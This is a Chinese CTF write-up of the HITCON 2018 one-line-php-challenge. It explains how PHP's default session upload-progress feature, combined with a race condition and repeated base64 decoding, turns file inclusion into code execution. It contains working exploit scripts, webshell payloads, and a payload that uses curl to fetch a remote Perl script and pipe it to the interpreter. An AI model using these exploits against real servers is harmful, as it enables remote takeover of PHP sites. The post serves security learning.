---
title: hitcon 2018受虐笔记一:one-line-php-challenge 学习
url: 718.html
id: 718
categories:
  - hack_ctf
date: 2018-10-23 13:18:53
tags:
  - ctf
  - hitcon2018
  - php
---

都是老知识，但是我依然不会做。。。。蓝瘦

<!--more-->

## 0x1 历史回顾

任意文件包含漏洞，如果`session.upload_progress.enabled=On`开启，就可以包含session来getshell。这种思路在CTF中已经被利用了N多次了。在这里再回顾一下，加深一下印象。

参考Session 上传进度的文档[http://php.net/manual/zh/session.upload-progress.php](http://php.net/manual/zh/session.upload-progress.php)

![http://pic.wonderkun.cc/uploads/2018/10/1.png](http://pic.wonderkun.cc/uploads/2018/10/1.png)

手册上有一个例子，如下:

一个上传进度数组的结构的例子

```html
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```

在session中存放的数据看上去是这样子的：

```php
<?php
$_SESSION["upload_progress_123"] = array(
 "start_time" => 1234567890,   // The request time
 "content_length" => 57343257, // POST content length
 "bytes_processed" => 453489,  // Amount of bytes received and processed
 "done" => false,              // true when the POST handler has finished, successfully or not
 "files" => array(
  0 => array(
   "field_name" => "file1",       // Name of the <input/> field
   // The following 3 elements equals those in $_FILES
   "name" => "foo.avi",
   "tmp_name" => "/tmp/phpxxxxxx",
   "error" => 0,
   "done" => true,                // True when the POST handler has finished handling this file
   "start_time" => 1234567890,    // When this file has started to be processed
   "bytes_processed" => 57343250, // Amount of bytes received and processed for this file
  ),
  // An other file, not finished uploading, in the same request
  1 => array(
   "field_name" => "file2",
   "name" => "bar.avi",
   "tmp_name" => NULL,
   "error" => 0,
   "done" => false,
   "start_time" => 1234567899,
   "bytes_processed" => 54554,
  ),
 )
);
```

session中存储上传进度的键值是：

```php
ini_get('session.upload_progress.prefix').$_POST[ini_get['session.upload_progress.name']]；
```

其中`$_POST[ini_get['session.upload_progress.name']]；`是一个我们可控的值，如果把它控制成一个shell的内容，然后包含session就可以getshell了。

```html
<input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="<?php eval($_GET[1]); ?>" />
```

如果`session.upload_progress.cleanup=On`开启：

Cleanup the progress information as soon as all POST data has been read (i.e. upload completed). Defaults to 1, enabled.

如果POST一被读取，session的内容就会被清空，所以为了在清空之前能包含到有我们payload的session，还需要用条件竞争。

记得当时在@wupco在SCTF2018的题目的非预期解，[https://www.cnblogs.com/iamstudy/articles/sctf2018_simple_php_web_writeup.html](https://www.cnblogs.com/iamstudy/articles/sctf2018_simple_php_web_writeup.html)

我当时以为`session.upload_progress.enabled=On`仅仅是个意外，是@l3m0n题目环境的问题，当时今天我才发现，php默认就是开启的.....参考手册：

[http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name)

![http://pic.wonderkun.cc/uploads/2018/10/2.png](http://pic.wonderkun.cc/uploads/2018/10/2.png)
默认就开启的这个性质相当棒啊。。。。

最后给一个利用的exp吧：

```python
#!coding:utf-8

import requests
import time
import threading


host = 'http://your-ip:8088/'
PHPSESSID = 'vrhtvjd4j1sd88onr92fm9t2gt'

def creatSession():
    while True:
        files = {
        "upload" : ("tmp.jpg", open("/etc/passwd", "rb"))
        }
        data = {"PHP_SESSION_UPLOAD_PROGRESS" : "<?php echo md5('1');?>" }
        headers = {'Cookie':'PHPSESSID=' + PHPSESSID}
        r = requests.post(host,files = files,headers = headers,data=data)

fileName = "/var/lib/php/sessions/sess_"+PHPSESSID

if __name__ == '__main__':

    url = "{}/index.php?file={}".format(host,fileName)
    headers = {'Cookie':'PHPSESSID=' + PHPSESSID}
    t = threading.Thread(target=creatSession,args=())
    t.setDaemon(True)
    t.start()
    while True:
        res = requests.get(url,headers=headers)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.content:
            print("[*] Get shell success.")
            break
        else:
            print("[-] retry.")
```

## 0x2 hitcon2018 one-line-php-challenge 

题目代码如下：

```php
($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);
```

题目描述：P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04

### php的session.upload_progress.enabled=On引起的一个小问题

由于这个题目连session都没开，所以我根本就没有考虑去包含session。

但是最后看了orange的exp我才发现，只要发的POST请求中只要包含`ini_get("session.upload_progress.name")`这个键值，并带上session_id，同时进行文件上传，就会直接创建一个session文件。

测试如下，先删除session文件：

```bash
root@e5dfc152ed97:/var/lib/php/sessions# pwd
/var/lib/php/sessions
root@e5dfc152ed97:/var/lib/php/sessions# rm -rf *
```

然后发起请求：

```
POST /?file=test HTTP/1.1
Host: 127.0.0.1:8088
Connection: close
Accept: */*
User-Agent: python-requests/2.18.4
Cookie: PHPSESSID=u0hgfruaudns3jigq5trocbr0m
Content-Length: 290
Content-Type: multipart/form-data; boundary=--------713660820

----------713660820
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

test
----------713660820
Content-Disposition: form-data; name="upload";filename='test'

test
----------713660820
Content-Disposition: form-data; name="submit"

submit
----------713660820--

```

在服务器端成功的创建了session文件：

```bash
root@e5dfc152ed97:/var/lib/php/sessions# ls
sess_u0hgfruaudns3jigq5trocbr0m
```

emmmmm , php是最好的语言。。。。

### 利用php base64_decode 的容错，去掉upload_progress_

session文件的内容如下：

```
root@e5dfc152ed97:/var/lib/php/sessions# for i in `seq 1 300`; do cat sess_u0hgfruaudns3jigq5trocbr0m ; done
upload_progress_@<?php eval($_GET[1]);|a:5:{s:10:"start_time";i:1540269279;s:14:"content_length";i:315;s:15:"bytes_processed";i:
315;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:6:"upload";s:4:"name";s:4:"test";s:8:"tmp_name";N;s:5:"error";i
:0;s:4:"done";b:0;s:10:"start_time";i:1540269279;s:15:"bytes_processed";i:315;}}}
```

需要绕过下面这个限制，多了额外的字符`upload_progress_`

```php
@substr(file($_)[0],0,6) === '@<?php' 
```

这里可以利用多次base64解码来去除`upload_progress_`。

因为base64解码函数可以接受的字符范围是`[A-Za-z0-9+/=]`，但是如果php的base64_decode遇到了不在此范围内的字符，php就会直接跳过这些字符，只把在此范围的字符连起来进行解码。@phith0n师父早就说过这个问题，而我在做题的时候还是妥妥的忘掉了。。

我们来做个试验：

```php
$i = 0 ;
$data = "upload_progress_ZZ";
while(true){
    $i += 1;
    $data = base64_decode($data); 
    var_dump($data);
    sleep(1);
    if($data == ''){
        echo "一共解码了:".$i,"次\n";
        break;
    }
}
```

运行结果如下：

```php
string(12) "��hi�k�
޲�Y"
string(3) "�)"
string(0) ""
一共解码了:3次
```

`upload_progress_ZZ`一共是18个字符，但是由于base64_decode跳过了`_`，所以是剩下16个字符，解码一次之后是12个字符，又因为12个字符中只有4个在范围内，所以再次解码之后变为了3个字符，这三个字符都不在范围内，所以解码之后为空字符串。

这里需要注意的是我们在`upload_progress_`前缀后面扩展了两位是`ZZ`，这个`ZZ`的选择也是非常有讲究的，必须保证每一次的的base64解码之后的可接受字符个数都必须是4的整数倍,否则就会吞掉后面的payload。

举个例子`upload_progress_AA`就是不满足条件的，因为一次base64解码之后变为了

```
string(12) "��hi�k�
޲�"
```

可接受字符变为了3个，不是4的倍数，那么在下一次进行base64解码的时候，一定会吞掉后面的一位，导致payload部分被破坏掉。

所以最后控制SESSION的key值为：

```php
"upload_progress_ZZ".base64_encode(base64_encode(base64_encode('@<?php eval($_GET[1]);')));
```

然后进行三次的base_64decode，就会去掉`upload_progress_`,只剩下`@<?php eval($_GET[1]);`

最后附上orange的exp:

```python
import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool



HOST = 'http://54.250.246.238/'
sess_name = 'iamorange'

headers = {
    'Connection': 'close', 
    'Cookie': 'PHPSESSID=' + sess_name
}

payload = '@<?php `curl orange.tw/w/bc.pl|perl -`;?>'


while 1:
    junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
    x = b64encode(payload + junk)
    xx = b64encode(b64encode(payload + junk))
    xxx = b64encode(b64encode(b64encode(payload + junk)))
    if '=' not in x and '=' not in xx and '=' not in xxx:
        print xxx
        break

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + xxx + 'Z'
    }
    while 1:
        fp = open('/etc/passwd', 'rb')
        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename
    # print filename
    while 1:
        url = '%s?orange=%s' % (HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content
        if c and 'orange' not in c:
            print [c]

if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
```